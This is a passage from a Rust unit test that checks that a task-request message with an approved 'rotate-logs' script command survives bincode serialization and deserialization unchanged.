    fn message_serialization_roundtrip() {
        let msg = Message::TaskRequest {
            task_id: "t-1".into(),
            command: Command::RunApprovedScript {
                script: "rotate-logs".into(),
            },
            operator_id: None,
        };
        let bytes = bincode::serialize(&msg).unwrap();
        let back: Message = bincode::deserialize(&bytes).unwrap();
        match back {
            Message::TaskRequest {
                task_id, command, ..
            } => {
                assert_eq!(task_id, "t-1");
                assert!(matches!(
                    command,
                    Command::RunApprovedScript { script } if script == "rotate-logs"
                ));
            }
            _ => panic!("unexpected variant"),
        }
    }
}
